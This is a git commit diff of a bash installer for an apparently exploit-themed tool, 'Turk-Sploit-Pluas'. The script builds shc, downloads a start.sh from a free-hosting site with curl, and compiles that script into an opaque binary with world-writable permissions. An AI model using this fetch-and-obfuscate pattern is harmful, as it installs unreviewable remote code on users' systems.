277f0904a99b88188e5f3b0818915fd271b2bc6b
yamanefkar <38867900+yamanefkar@users.noreply.github.com>
2019-08-07 14:52:44 +0300

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,12 +1,16 @@
 #!/bin/bash
 apt install shc -y
+apt install clang -y
+apt install curl -y 
+apt install wget -y
 cd $HOME
 wget http://www.datsi.fi.upm.es/~frosal/sources/shc-3.8.9.tgz
 tar -xvf shc-3.8.9.tgz
 cd shc-3.8.9/
 make
 curl -O https://turksibertimi-forum.000webhostapp.com/start.sh
-shc -f start.sh
+clang shc.c -o shc && chmod 777 shc
+./shc -f start.sh
 cd $HOME &&
 cp start.sh.x  $HOME/Turk-Sploit-Pluas/
 cd $HOME/shc-3.8.9/ && cp start.sh.x  $HOME/Turk-Sploit-Pluas/
